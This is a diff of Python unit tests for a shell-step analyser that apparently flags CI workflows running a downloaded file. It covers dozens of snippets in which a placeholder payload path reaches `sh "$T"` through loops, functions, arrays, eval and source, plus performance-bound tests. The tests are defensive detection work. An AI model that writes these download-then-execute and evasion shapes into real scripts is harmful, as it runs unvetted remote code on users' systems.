+        'T=x; ' + "; ".join("false && T=%d" % number for number in range(1, 8)) + '; [ -z "$NOPE" ] && T=@P@; sh "$T"',
+        # A word's product holding the payload: within 64 (`$D/$N`, the ninth: round 8 enumerates
+        # it; round 7's spelling ran `/tmp/payload`, no download, and passed on the stand-in alone)
+        # and past 64 (`$A/$B$C$D`, the 81st: the stand-in); and the argv cap (a ninth `$S $T`).
+        'D=/x; false && D=/y; [ -z "$NOPE" ] && D=.; N=a; false && N=b; [ -z "$NOPE" ] && N=@P@; '
+        'sh "$D/$N"',
+        'A=/x; false && A=/y; [ -z "$NOPE" ] && A=.; B=a; false && B=b; [ -z "$NOPE" ] && B=t; C=c; '
+        'false && C=d; [ -z "$NOPE" ] && C=o; D=e; false && D=f; [ -z "$NOPE" ] && D=ol; sh "$A/$B$C$D"',
+        'S=:; false && S=true; [ -z "$NOPE" ] && S=sh; T=a; false && T=b; [ -z "$NOPE" ] && T=@P@; $S "$T"',
+        # The stand-in reaches a use through a copy, a function body and a command word.
+        'for T in a b c d e f g h @P@; do :; done; U="$T"; sh "$U"',
+        'for T in a b c d e f g h @P@; do :; done; run() { sh "$T"; }; run',
+        'for T in a b c d e f g h @P@; do :; done; chmod +x "$T"; "$T"')
+    BASH_RUN = (  # B4: DM01; and DM06, the control with six decoys (dash has no `declare`)
+        'T=x; [ -z "${NOPE:-}" ] && declare -a T=(@P@); f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; T=g; '
+        'fi; }; f; sh "$T"',
+        'T=x; [ -z "${NOPE:-}" ] && declare -a T=(@P@); f() { if false; then T=a; T=b; T=c; T=d; T=e; T=f; fi; }; '
+        'f; sh "$T"')
+    PRICE = (  # nine candidates, none the payload: no shell runs a download, and each reports
+        'for T in a b c d e f g h i; do :; done; sh "$T"',
+        'T=x; ' + "; ".join("false && T=%d" % number for number in range(1, 9)) + '; sh "$T"')
+    NONE_RUN = (
+        'for T in a b c d e f g h; do :; done; sh "$T"',                  # eight: within the cap
+        'for T in a b c d e f g h @P@; do :; done; echo "$T"',            # nine, and no use
+        'for T in a b c d e f g h @P@; do :; done; T=/dev/null; sh "$T"',  # a whole write ends it
+        'for T in a b c d e f g h @P@; do :; done; unset T; sh "${T:-/dev/null}"',  # a sure unset
+        # F3: a body's call in a list it backgrounds is not followed (DK21), as at the top level,
+        # whose forked calls stay clear: DK01, DK04, DK17, and a group piped on.
+        'T=/dev/null; f() { T=@P@; }; g() { f & wait; }; g; sh "$T"',
+        # Round 9, B2: a list's end decides, read once walking the body back (round 8, B3), so
+        # `f && : &` and `f || : &` send `f` to the background too (BG07, BG18).
+        'T=/dev/null; f() { T=@P@; }; g() { f && : & wait; }; g; sh "$T"',
+        'T=/dev/null; f() { T=@P@; }; g() { f || : & wait; }; g; sh "$T"',
+        'T=/dev/null; f() { T=@P@; }; f & wait; sh "$T"',
+        'T=/dev/null; f() { T=@P@; }; ( f ) & wait; sh "$T"',
+        'T=/dev/null; f() { T=@P@; }; if true; then f; fi & wait; sh "$T"',
+        'T=/dev/null; f() { T=@P@; }; { f; } | cat; sh "$T"')
+    # F3, named: `eval -p f` and `eval -- -- f` run no `f` (bash rejects `-p`; dash runs `--`),
+    # but the guard's `eval` reader keeps the words not led by `-` as the program bash runs,
+    # fail-closed, and the carry follows the call it reads there -- an over-report, bounded.
+    NAMED = ('T=/dev/null; f() { T=@P@; }; eval -p f 2> /dev/null || :; sh "$T"',
+             'T=/dev/null; f() { T=@P@; }; eval -- -- f 2> /dev/null || :; sh "$T"')
+
+    def test_each_payload_row_is_reported(self):
+        for rows, shells in ((self.ALL_RUN, SHELLS), (self.BASH_RUN, (None, "bash", "bash {0}"))):
+            for row in rows:
+                for shell in shells:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(filled(row), shell))
+
+    def test_the_price_and_the_named_over_reports_are_reported(self):
+        for row in self.PRICE + self.NAMED:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+    def test_each_honest_clear_stays_clear(self):
+        for row in self.NONE_RUN:
+            for shell in SHELLS:
+                with self.subTest(row=row, shell=shell):
+                    self.assertFalse(reported(filled(row), shell))
+
+
+class TestTheStandInHoldsItsKeysAndAProductItsBound(unittest.TestCase):
+    """PR #2855 round 8, the round-7 verdict. B1: a write of word 0 to an array past the cap
+    (`T=y`, `export T=y`, `declare T=y`) kept only the new word, though bash's `T=y` is `T[0]=y` and
+    keeps every other key: the stand-in now stays at the keys the write leaves. B2, the
+    coordinator's ruling: a product of a word's or an argv's references holds 64 before the
+    stand-in, a name's own cap staying 8, so the common honest installer shapes (`unzip
+    "tool-$V-$ARCH.zip"`, 3 x 3) read CLEAN as on `main`; past 64 the stand-in stands, a named
+    price. F3: a one-line body that opens with an array literal is no subshell, and carries.
+    Truth: b5e b3e dash-e b5 b3 dash, and the `{0}` pair (R ran the payload)."""
+
+    BASH_RUN = (  # EW01, EW06, EW07, EX04, and F3's BA01, BA05, BA08: both bashes run P, dash no arrays
+        'declare -a T=(a); f() { if false; then T=(b); T=(c); T=(d); T=(e); T=(f); T=(g); T=(h); fi; }; f; '
+        '[ -z "${NOPE:-}" ] && T=(x @P@); T=y; sh "${T[1]}"',
+        'declare -a T=(a); f() { if false; then T=(b); T=(c); T=(d); T=(e); T=(f); T=(g); T=(h); fi; }; f; '
+        '[ -z "${NOPE:-}" ] && T=(x @P@); export T=y; sh "${T[1]}"',
+        'declare -a T=(a); f() { if false; then T=(b); T=(c); T=(d); T=(e); T=(f); T=(g); T=(h); fi; }; f; '
+        '[ -z "${NOPE:-}" ] && T=(x @P@); declare T=y; sh "${T[1]}"',
+        'declare -a CMD=(true)\ndetect() {\n  case "$(uname -s)" in\n    Darwin) CMD=(a);;\n    FreeBSD) CMD=(b);;\n'
+        '    OpenBSD) CMD=(c);;\n    NetBSD) CMD=(d);;\n    SunOS) CMD=(e);;\n    AIX) CMD=(f);;\n    HP-UX) CMD=(g);;\n'
+        '  esac\n}\ndetect\n[ -n "${CUSTOM:-}" ] || CMD=(x @P@)\nCMD=sh\n"${CMD[@]}"',
+        'T=/dev/null; g() { A=(x); T=@P@; }; g; sh "$T"',
+        'T=/dev/null; g() { declare -a A=(x); T=@P@; }; g; sh "$T"',
+        'T=/dev/null; g() { ARGS=(-fsSL); T=@P@; }; g; sh "$T"')
+    HONEST = (  # PX01, PX02-shaped, PX22, EX10, EX11, EX12, EX15: products within 64, nothing runs
+        'A=1; false && A=2; false && A=3; B=x; false && B=y; false && B=z; sh -c : "$A" "$B"',
+        'OS=linux; [ -n "${D:-}" ] && OS=darwin; [ -n "${W:-}" ] && OS=windows; ARCH=amd64; '
+        '[ -n "${A:-}" ] && ARCH=arm64; [ -n "${P:-}" ] && ARCH=ppc64le; tar -xzf "tool-$OS-$ARCH.tar.gz" 2> /dev/null || :',
+        'V=1; false && V=2; false && V=3; ARCH=amd64; false && ARCH=arm64; false && ARCH=x86; '
+        'unzip -q "tool-$V-$ARCH.zip" 2> /dev/null || :',
+        'A=1; false && A=2; false && A=3; sh -c : "$A" "$A"',
+        'A=1; false && A=2; false && A=3; sh -c : "$A$A"',
+        'F=a; false && F=b; false && F=c; install -m 755 "$F" "/tmp/bin-$F" 2> /dev/null || :',
+        'A=1; false && A=2; B=1; false && B=2; C=1; false && C=2; D=1; false && D=2; sh -c : "$A" "$B" "$C" "$D"')
+    # The price past 64, named: four names of three candidates each at a runner (81), none the
+    # payload, reported as a use the table no longer bounds.
+    PRICE = ('A=1; false && A=2; false && A=3; B=x; false && B=y; false && B=z; C=p; false && C=q; false && C=r; '
+             'D=u; false && D=v; false && D=w; sh "$A$B$C$D" 2> /dev/null || :',)
+
+    def test_each_bash_row_is_reported(self):
+        for row in self.BASH_RUN:
+            for shell in (None, "bash", "bash {0}"):
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+    def test_a_product_within_64_reads_clean_and_past_it_is_the_price(self):
+        for rows, expected in ((self.HONEST, False), (self.PRICE, True)):
+            for row in rows:
+                for shell in SHELLS:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertEqual(expected, reported(filled(row), shell))
+
+    def test_a_call_site_carries_once_per_step(self):
+        # B5: a body of K statements called K times reads in about main's time, not K times its
+        # cube: each call site's carry from one state of its bodies' names is made once
+        # (`workflow_called._carried`; round 9 keys it on those names, not the whole table).
+        # #2858's union: `job_defects` reads the step TWICE, one `_job_defects` call after the other
+        # -- `main`'s pass under `mains_answer()`, then the walk's -- so each pass is timed on its
+        # own, in the one run, and held to the bound the single reading had; the passes are counted
+        # too, as `TestACallSiteCarriesAFixedNumberOfTimes` counts them.
+        import time
+        from unittest import mock
+        body = "g() {\n" + "".join(": %d\n" % i for i in range(150)) + "}\n"
+        took, real = [], wg._job_defects
+
+        def timed(*args, **kwargs):
+            start = time.perf_counter()
+            try:
+                return real(*args, **kwargs)
+            finally:
+                took.append(time.perf_counter() - start)
+        with mock.patch.object(wg, "_job_defects", timed):
+            reported(GET + body + "g\n" * 150 + "sh /dev/null\n")
+        self.assertEqual(TestACallSiteCarriesAFixedNumberOfTimes.PASSES, len(took))
+        self.assertLess(max(took), 8.0)
+
+
+class TestACallSiteCarriesAFixedNumberOfTimes(unittest.TestCase):
+    """PR #2855 round 11, the round-10 verdict's B3 (the memo goes): `static_values` rebuilds the
+    table at every statement that reads it, so a call site is visited at every rebuild after it --
+    carried each time, round 8 was cubic where `main` is quadratic, and a memo keyed on the state of
+    the bodies' names grew again where the step assigns the words a body spells. A call site now
+    carries its bodies `_BUDGET` (8) times a step, and past that each name they may set holds the
+    cap's stand-in, a price; where one may set any name (`eval`, `source`), each name the table
+    holds does too -- each once a walk, then what changed since. Round 12 (the round-11 verdict's
+    B2): a carry costs the statements it walks and the names it copies, and one costing more than
+    `_WORK` counts as more than one; a body that may write nothing is not carried; and a stand-in
+    makes no list it needs not (`workflow_called._stood`). Pinned by the carry's cost (its CPU time,
+    the collector on, beside the same step read with no carry, and its work at two sizes), by a
+    site's work and by the carries counted."""
+
+    @staticmethod
+    def body(size, first=""):
+        # The coordinator's word body (round 10): `: s0 .. : s<K-1>`, words no statement sets.
+        return "g() {\n" + first + "".join(": s%d\n" % i for i in range(size)) + "}\n"
+
+    @staticmethod
+    def assigned(size):
+        # Round 11 (the round-10 verdict's B3): the word body, each word a name the step assigns first.
+        return "".join("s%d=x\n" % i for i in range(size)) + TestACallSiteCarriesAFixedNumberOfTimes.body(size)
+
+    @staticmethod
+    def wide(size, line):
+        return "log() { %s; }\n" % line + "".join("V%d=v%d\n" % (i, i) for i in range(size)) + "log\n" * size
+
+    def looped(self, size, first="", head="for i in 1 2; do\n", tail="done\n"):
+        return self.body(size, first) + head + "".join("X=a%d; g\n" % j for j in range(size)) + tail
+
+    @staticmethod
+    def between(size, line):
+        # A write between every two calls of an `eval` or `.` body (the round-10 seat's `evalbetween`).
+        return "log() { %s; }\n" % line + "".join("V%d=v%d; log\n" % (i, i) for i in range(size))
+
+    @staticmethod
+    def calls(size):
+        # A body setting K names, called K times (the round-11 seat's `calls`).
+        return "log() {\n" + "".join("W%d=x\n" % i for i in range(size)) + "}\n" + "log\n" * size
+
+    @staticmethod
+    def ratio(script):
+        """The step's CPU time with the carry over its time with `record_called` a no-op, the collector
+        on as it runs: round 12 (the round-11 verdict's B2) -- its seat's collector term, 9-21x `main`'s
+        and growing faster than the step, was the lists the visits made, which a run with it off hid."""
+        import time
+        from unittest import mock
+
+        def cost():
+            start = time.process_time()
+            reported(GET + script + "sh /dev/null\n")
+            return time.process_time() - start
+        with mock.patch.object(workflow_uses, "record_called", lambda *args: None):
+            bare = cost()
+        return cost() / bare
+
+    def test_each_shape_costs_a_constant_factor_of_the_step_without_the_carry(self):
+        while_head, while_tail = "n=0\nwhile [ $n -lt 2 ]; do\n", "n=$((n+1))\ndone\n"
+        for name, script, bound in (
+                ("loop", self.looped(60), 1.5),
+                ("while", self.looped(60, head=while_head, tail=while_tail), 1.5),
+                ("flat", self.body(100) + "".join("X=a%d; g\n" % j for j in range(100)), 1.5),
+                ("reads", self.looped(60, "U=$X\n"), 1.8),
+                # The round-10 verdict's B3, at two sizes: the ratio holds as K doubles (round 10's
+                # went 1.25 -> 1.68 and 1.20 -> 1.59 here).
+                ("flatassigned 50", self.assigned(50) + "".join("X=a%d; g\n" % j for j in range(50)), 1.5),
+                ("flatassigned 100", self.assigned(100) + "".join("X=a%d; g\n" % j for j in range(100)), 1.5),
+                ("loopassigned 30", self.assigned(30) + self.looped(30)[len(self.body(30)):], 1.5),
+                ("loopassigned 60", self.assigned(60) + self.looped(60)[len(self.body(60)):], 1.5),
+                # Round 12, the round-11 verdict's B2: its six shapes at two sizes each. `calls` costs
+                # most where a site's eight carries of its K statements fit `_WORK`, and less as K
+                # grows past it (3.9x -> 5.7x `main` from K = 50 to 3,200 in round 11).
+                ("wide 75", self.wide(75, ":"), 1.5), ("wide 150", self.wide(150, ":"), 1.5),
+                ("eval 75", self.wide(75, "eval :"), 1.8), ("eval 150", self.wide(150, "eval :"), 1.8),
+                ("source 75", self.wide(75, ". /dev/null"), 1.8), ("source 150", self.wide(150, ". /dev/null"), 1.8),
+                ("eval between 75", self.between(75, "eval :"), 1.8),
+                ("eval between 150", self.between(150, "eval :"), 1.8),
+                ("source between 75", self.between(75, ". /dev/null"), 1.8),
+                ("source between 150", self.between(150, ". /dev/null"), 1.8),
+                ("calls 100", self.calls(100), 4.5), ("calls 200", self.calls(200), 3.0)):
+            with self.subTest(shape=name):
+                ratio = self.ratio(script)
+                if ratio >= bound:          # once more, against a busy machine
+                    ratio = min(ratio, self.ratio(script))
+                self.assertLess(ratio, bound)
+
+    @staticmethod
+    def work(script):
+        """The carry's work for `script`, counted: each statement a carry walks (`_carry_one`, a dry one
+        for what a statement may set too), each name it copies (what the caller holds of the names it
+        is given, or the whole table), each own stand-in (`_own`, and `emptied` for a body's `unset`) and
+        each stand-in given past the budget (`_stood`) -- round 12 (the round-11 verdict's B2: the count
+        of carries and table sizes missed the statements a carry walks)."""
+        from unittest import mock
+        done = [0]
+        real_carry, real_one, real_emptied, real_own, real_stood = (workflow_called._carry, workflow_called._carry_one,
+                                                                    workflow_called.emptied, workflow_called._own,
+                                                                    workflow_called._stood)
+
+        def carry(table, stmts, head, close, positions=None, names=None):
+            held = {*table.scalars, *table.arrays}
+            done[0] += len(held) if names is None else len(held & set(names))
+            return real_carry(table, stmts, head, close, positions, names)
+
+        def counted(real):
+            def call(*args, **kwargs):
+                done[0] += 1
+                return real(*args, **kwargs)
+            return call
+        with mock.patch.object(workflow_called, "_carry", carry), \
+                mock.patch.object(workflow_called, "_carry_one", counted(real_one)), \
+                mock.patch.object(workflow_called, "emptied", counted(real_emptied)), \
+                mock.patch.object(workflow_called, "_own", counted(real_own)), \
+                mock.patch.object(workflow_called, "_stood", counted(real_stood)):
+            reported(GET + script + "sh /dev/null\n")
+        return done[0]
+
+    def test_a_visit_costs_what_changed_not_the_words_or_the_table(self):
+        # `main`'s rebuilds visit a call site about K^2 times in all, so the carry's work may grow four
+        # times when K doubles, and no faster: round 11 bounded it at five, which let K^2.3 through (its
+        # seat's B2). Round 9 keyed every word a body spells (`: s0 .. : s<K-1>`), round 10 every one the
+        # step assigns first, round 11 copied the whole table a carry (`wide`), gave every name its own
+        # stand-in at every visit (its seat's mA5) and had a site's carries walk K statements eight times
+        # (`many names set`): each fails here. Sized past the budget's onset.
+        while_head, while_tail = "n=0\nwhile [ $n -lt 2 ]; do\n", "n=$((n+1))\ndone\n"
+        for name, make in (("loop", lambda k: self.looped(k)),
+                           ("while", lambda k: self.looped(k, head=while_head, tail=while_tail)),
+                           ("flat", lambda k: self.body(k) + "".join("X=a%d; g\n" % j for j in range(k))),
+                           ("wide", lambda k: self.wide(k, ":")),
+                           ("eval", lambda k: self.wide(k, "eval :")),
+                           ("source", lambda k: self.wide(k, ". /dev/null")),
+                           ("eval between writes", lambda k: self.between(k, "eval :")),
+                           ("source between writes", lambda k: self.between(k, ". /dev/null")),
+                           ("flatassigned", lambda k: self.assigned(k) + "".join("X=a%d; g\n" % j for j in range(k))),
+                           ("loopassigned", lambda k: self.assigned(k) + self.looped(k)[len(self.body(k)):]),
+                           # a body that sets K names, called K times: past the budget, a walk stands
+                           # each in at its first site, then what changed since
+                           ("many names set", lambda k: self.calls(k))):
+            with self.subTest(shape=name):
+                small, large = self.work(make(40)), self.work(make(80))
+                self.assertLess(large, 4 * small, (small, large))
+
+    def test_a_sites_carries_walk_and_copy_no_more_than_the_budget_of_work(self):
+        # Round 12 (the round-11 verdict's B2): a site carried a body of K statements setting K names
+        # eight times, walking and copying 16K a site, K^3 a step where `main` is quadratic. A carry
+        # costing more than `_WORK` counts as more than one, so a site's carries walk and copy
+        # `_BUDGET * _WORK` at most, eight carries of 128, whatever K -- and still carry (five times at
+        # 100, twice at 200).
+        from unittest import mock
+        spent, site = {}, [None]
+        real_called, real_carry, real_one = (
+            workflow_uses.record_called, workflow_called._carry, workflow_called._carry_one)
+        passes = self.each_pass(spent)
+
+        def called(table, stmts, position, starts):
+            site[0] = position
+            try:
+                return real_called(table, stmts, position, starts)
+            finally:
+                site[0] = None
+
+        def carry(table, stmts, head, close, positions=None, names=None):
+            if site[0] is not None:
+                spent[site[0]] = spent.get(site[0], 0) + len({*table.scalars, *table.arrays} & set(names or ()))
+            return real_carry(table, stmts, head, close, positions, names)
+
+        def one(*args):
+            if site[0] is not None:
+                spent[site[0]] = spent.get(site[0], 0) + 1
+            return real_one(*args)
+        for size in (100, 200):
+            with self.subTest(size=size):
+                spent.clear()
+                passes.clear()
+                with mock.patch.object(workflow_uses, "record_called", called), \
+                        mock.patch.object(workflow_called, "_carry", carry), \
+                        mock.patch.object(workflow_called, "_carry_one", one), \
+                        mock.patch.object(wg, "_job_defects", passes.entered):
+                    reported(GET + self.calls(size) + "sh /dev/null\n")
+                self.assertEqual(self.PASSES, len(passes))
+                for each in passes:
+                    self.assertTrue(each)
+                    self.assertLessEqual(max(each.values()), 8 * 128)
+
+    def test_each_statement_is_read_for_what_it_may_set_once_a_step(self):
+        # Round 12 (its seat's F4, mC7): `_Step.set_at` keeps what each statement may set, so the
+        # narrowing past the budget reads a statement once a step, not once a visit -- K visits a walk
+        # over the K statements between them, K walks.
+        from unittest import mock
+        count = [0]
+        real = workflow_called._written
+
+        def written(*args):
+            count[0] += 1
+            return real(*args)
+        for size in (40, 80):
+            with self.subTest(size=size):
+                count[0] = 0
+                script = GET + self.between(size, "eval :") + "sh /dev/null\n"
+                with mock.patch.object(workflow_called, "_written", written):
+                    reported(script)
+                self.assertLessEqual(count[0], 2 * len(shell_reader.statements(script)))
+
+    @staticmethod
+    def copied(script):
+        """The names in each table `record_called` builds for `script`: a carry's copy of the
+        caller's table, every name of which it merges back, and `_effects`' dry one."""
+        from unittest import mock
+        sizes, inside = [], [False]
+        real_init, real_called = workflow_called.Values.__init__, workflow_uses.record_called
+
+        def init(self, *args, **kwargs):
+            real_init(self, *args, **kwargs)
+            if inside[0]:
+                sizes.append(len(self.scalars) + len(self.arrays))
+
+        def called(*args):
+            inside[0] = True
+            try:
+                return real_called(*args)
+            finally:
+                inside[0] = False
+        with mock.patch.object(workflow_called.Values, "__init__", init), \
+                mock.patch.object(workflow_uses, "record_called", called):
+            reported(GET + script + "sh /dev/null\n")
+        return sizes
+
+    def test_a_carry_copies_and_merges_only_the_names_its_bodies_spell_or_set(self):
+        # PR #2855 round 12 (the round-11 seat's cost bar): a carry copied the caller's whole table
+        # and merged each name back -- K names a carry, eight carries a site -- where `log() { :; }`
+        # spells none, so `wide` outgrew `main`'s quadratic on the forge (1.13x at K = 400 to 1.23x at
+        # 3,200). It copies and merges the names its bodies spell or set, plus `_effects`' probe: the
+        # same at both sizes, where round 11's grew with the K names the step assigns.
+        for name, line, bound in (("nothing spelled", ":", 2), ("one read, one set", "X=$V0", 4)):
+            for size in (40, 80):
+                with self.subTest(body=name, size=size):
+                    sizes = self.copied(self.wide(size, line))
+                    self.assertTrue(sizes)
+                    self.assertLessEqual(max(sizes), bound, (max(sizes), len(sizes)))
+
+    # #2858's union: `job_defects` reads a step TWICE, one `_job_defects` call after the other --
+    # `main`'s pass under `mains_answer()`, then the walk's -- and each pass carries the sites within
+    # the budget on its own. So a step's carries are kept per pass, in the one run, and the passes
+    # are counted too: a third one is a change, and each pass is held to the budget, not their mean.
+    PASSES = 2
+
+    @staticmethod
+    def each_pass(current):
+        """A list of one `current`-shaped tally per `_job_defects` call: `entered` is the patch for
+        `wg._job_defects` that starts a pass -- `current` is emptied and its contents at the pass's end
+        are what the list keeps -- so the tallies the other patches add to `current` fall per pass."""
+        class Passes(list):
+            def entered(self, *args, **kwargs):
+                current.clear()
+                try:
+                    return real(*args, **kwargs)
+                finally:
+                    self.append(dict(current))
+        real = wg._job_defects
+        return Passes()
+
+    def carries(self, script):
+        """How many times `_carry` ran for `script` in each pass (each site's dry carry included)."""
+        from unittest import mock
+        count = {}
+        passes = self.each_pass(count)
+        real = workflow_called._carry
+
+        def counted(*args):
+            count["carries"] = count.get("carries", 0) + 1
+            return real(*args)
+        with mock.patch.object(workflow_called, "_carry", counted), \
+                mock.patch.object(wg, "_job_defects", passes.entered):
+            reported(GET + script + "sh /dev/null\n")
+        self.assertEqual(self.PASSES, len(passes))
+        return max(each.get("carries", 0) for each in passes)
+
+    def test_each_site_carries_within_the_budget(self):
+        # 24 sites of one body: one dry carry for them all, and at most 8 carries a site, where round
+        # 8 made 299 -- whatever the body reads or its loop changes.
+        for first in ("", "U=$X\n"):
+            with self.subTest(first=first):
+                self.assertLessEqual(self.carries(self.looped(24, first)), 1 + 24 * workflow_called._BUDGET)
+
+    # Past the budget, each name the bodies set holds the cap's stand-in: twelve calls of `g` in a
+    # loop; no shell runs a download in any row, and each reports, the budget's price -- where a
+    # body may set any name, each name the table holds (round 11, the round-10 verdict's B2, which
+    # round 10 had moved to must-clear: the round-9 seat's BU78-80).
+    PRICE = tuple(row % "".join("X=a%d; g; " % j for j in range(12)) for row in (
+        'T=/dev/null; g() { : "$X"; T=/dev/null; }; for i in 1 2; do %sdone; sh "$T"',
+        'T=/dev/null; g() { : "$X"; unset T; }; for i in 1 2; do %sdone; sh "${T:-/dev/null}"',
+        'T=/dev/null; g() { . ./env.sh; }; for i in 1 2; do %sdone; sh "$T"'))
+    # Within it (eight calls), each reads as the carry made it.
+    HONEST = tuple(row.replace("X=a8; g; X=a9; g; X=a10; g; X=a11; g; ", "") for row in PRICE[:2])
+    # Round 10 (B1): an array the bodies set takes the stand-in on its word-lists too, so its
+    # element reads report past the budget: `A=(x P)`, `A+=`, `declare -g -a`, a nested call, a
+    # `.` and an `eval` body, nine and thirty states (BU02, BU26, BU30, BU38, BU94; both bashes
+    # run the payload, dash has no arrays).
+    ELEMENTS = tuple(row % "".join('X=a%d; : "$X"\n' % j for j in range(states)) for row, states in (
+        ('g() { : "$X"; A=(x @P@); }\nfor i in 1 2; do\n%sg\ndone\nsh "${A[1]}"', 9),
+        ('g() { : "$X"; A+=(x @P@); }\nfor i in 1 2; do\n%sg\ndone\nsh "${A[1]}"', 9),
+        ('g() { : "$X"; declare -g -a A=(x @P@); }\nfor i in 1 2; do\n%sg\ndone\nsh "${A[1]}"', 9),
+        ('g() { : "$X"; h; }; h() { A=(x @P@); }\nfor i in 1 2; do\n%sg\ndone\nsh "${A[1]}"', 9),
+        ('g() { . /dev/null; : "$X"; A=(x @P@); }\nfor i in 1 2; do\n%sg\ndone\nsh "${A[1]}"', 9),
+        ('g() { eval :; : "$X"; A=(x @P@); }\nfor i in 1 2; do\n%sg\ndone\nsh "${A[1]}"', 9),
+        ('g() { : "$X"; A=(x @P@); }\nfor i in 1 2; do\n%sg\ndone\nsh "${A[1]}"', 30)))
+
+    def test_a_name_a_statement_sets_beside_any_is_one_it_changed(self):
+        # Round 11, the round-10 verdict's B1: the step's own `export "$K=v" X=/dev/null` sets `X`
+        # though it may set any name, so past the budget the next site stands `X` in again, as the
+        # sourced file sets it to the download (every shell runs it); read as setting nothing, `X`
+        # kept only the step's value.
+        row = ('K=Z\necho X=@P@ > xenv\ng() { . ./xenv; }\ng\nexport "$K=v" X=/dev/null\ng\n'
+               + ': "$X"\n' * 10 + 'sh "$X"')
+        for shell in SHELLS:
+            with self.subTest(shell=shell):
+                self.assertTrue(reported(filled(row), shell))
+
+    def test_past_the_budget_the_names_a_body_sets_hold_the_stand_in(self):
+        for rows, expected in ((self.PRICE, True), (self.HONEST, False)):
+            for row in rows:
+                for shell in SHELLS:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertEqual(expected, reported(filled(row), shell))
+        for row in self.ELEMENTS:
+            for shell in (None, "bash", "bash {0}"):
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+
+class TestASecondSiteOfTheSameBodiesCarriesWhatChanged(unittest.TestCase):
+    """PR #2855 round 10's rows, kept in round 11, where call sites no longer share a carry: a
+    redefinition between two sites of the same bodies -- of the function, or of one it calls -- or a
+    change to an array a body reads still reaches the use; and a carry walks only the statements
+    that may write (`workflow_called._writes`), so a body that writes through an expansion or
+    arithmetic is still carried. Truth: every shell runs the payload, dash none where the step
+    holds an array."""
+
+    ALL_RUN = (
+        'T=/dev/null; f() { T=a; }; f; f() { T=@P@; }; f; sh "$T"',
+        'T=/dev/null; h() { T=a; }; g() { h; }; g; h() { T=@P@; }; g; sh "$T"',
+        'T=/dev/null; f() { T=a; }; f; f() { T=@P@; }; for i in 1 2; do f; done; sh "$T"',
+        'T=/dev/null; f() { : 0; : 1; T=@P@; : 2; }; for i in 1 2; do X=a; f; X=b; f; done; sh "$T"')
+    BASH_RUN = ('T=/dev/null; f() { T=${A[1]}; }; A=(a b); f; A=(c @P@); f; sh "$T"',)
+
+    def test_each_is_reported(self):
+        for rows, shells in ((self.ALL_RUN, SHELLS), (self.BASH_RUN, (None, "bash", "bash {0}"))):
+            for row in rows:
+                for shell in shells:
+                    with self.subTest(row=row, shell=shell):
+                        self.assertTrue(reported(filled(row), shell))
+
+
+class TestAnArrayAnInnerSiteReadsReachesTheUse(unittest.TestCase):
+    """PR #2855 round 10, the round-9 verdict's B4: the round-9 seat's MP01 and MP05 move an array
+    an inner call site reads, and nothing else; the round-9 key without the array side read them
+    CLEAN (its m83). Kept in round 11, where each visit within the budget is a fresh carry. Truth:
+    both bashes run them. (MP07-MP09, rebuilt past the budget, are its price now:
+    `TestTheRoundTenSeatsRows`.)"""
+
+    BASH_RUN = ('h() { U=${A[1]}; }\ng() { h; sh "$U"; }\nA=(x /dev/null); g\nA=(x @P@); unset U; g',
+                'h() { U=${A[1]}; }\ng() { h; sh "$U"; }\nA=(x /dev/null); g\nunset U; A=(x @P@); g')
+
+    def test_an_array_an_inner_site_reads_is_in_its_state(self):
+        for row in self.BASH_RUN:
+            for shell in (None, "bash", "bash {0}"):
+                with self.subTest(row=row, shell=shell):
+                    self.assertTrue(reported(filled(row), shell))
+
+
+class TestTheRoundTenSeatsRows(unittest.TestCase):
+    """PR #2855 round 11, the round-10 verdict's B1, B2 and B4, on its seat's rows as it filled
+    them (`seat`: the download to `@P@`, its truth over eight parents).
+    - B1 (sets 59-61): a name that only a statement that may also set any name sets (`export "$K=v"
+      X=P`, `declare`, `typeset`, `declare -g`, `export "$K"`), which the memo's key did not hold,
+      so a carry shared by a second site restored a stale value. The memo is gone; every visit
+      within the budget is a fresh carry.
+    - B2 (sets 58-59): past the budget, a body that may set any name (`. ./cenv`, `source`, `read
+      -r "$N"`, `printf -v "$N"`, `export "$N=P"`, `. ./aenv` and an array) gives every name the
+      table holds the cap's stand-in on both sides, as `6bd4625f` did.
+    - B4, the fixed budget's price (set 53's MP07-MP09 and set 62's MV01, MV02 and MV06; no shell
+      runs anything): a call site rebuilt past `_BUDGET` times -- a call, then more than eight
+      statements that read the table -- stands in what its bodies may set, and where one may set any
+      name, every name the table holds, so the use reads every download."""
+
+    B1 = (
+        ('XA01', '11111111', 'K=Z\nT=/dev/null\ng() { T=$X; }\nexport "$K=v" X=/dev/null\ng\nexport "$K=v" X=@P@\nT=/dev/null\nexport "$K=v"\ng\nsh "$T"'),
+        ('XA05', '11111100', 'K=Z\nT=/dev/null\ng() { T=$X; }\ndeclare "$K=v" X=/dev/null\ng\ndeclare "$K=v" X=@P@\nT=/dev/null\ndeclare "$K=v"\ng\nsh "$T"'),
+        ('XA09', '11111100', 'K=Z\nT=/dev/null\ng() { T=$X; }\ntypeset "$K=v" X=/dev/null\ng\ntypeset "$K=v" X=@P@\nT=/dev/null\ntypeset "$K=v"\ng\nsh "$T"'),
+        ('XA22', '11111111', 'K=Z\nT=/dev/null\ng() { T=$X; }\nh() { g; }\nexport "$K=v" X=/dev/null\nh\nexport "$K=v" X=@P@\nT=/dev/null\nexport "$K=v"\nh\nsh "$T"'),
+        ('XA23', '11111111', 'K=Z\nT=/dev/null\ng() { T=$X; }\nexport "$K=v" X=/dev/null\ng\nexport "$K=v" X=@P@\nT=/dev/null\nexport "$K=v"\nif :; then g; fi\nsh "$T"'),
+        ('XA24', '11111111', 'K=Z\nT=/dev/null\ng() { : 0; T=$X; : 1; }\nexport "$K=v" X=/dev/null\ng\nexport "$K=v" X=@P@\nT=/dev/null\nexport "$K=v"\ng\nsh "$T"'),
+        ('XA25', '11111111', 'K=Z\nT=/dev/null\ng() { T=$X; }\nexport "$K=v" X=/dev/null\ng\nexport "$K=v" X=@PD@/@PN@\nT=/dev/null\nexport "$K=v"\ng\nsh "$T"'),
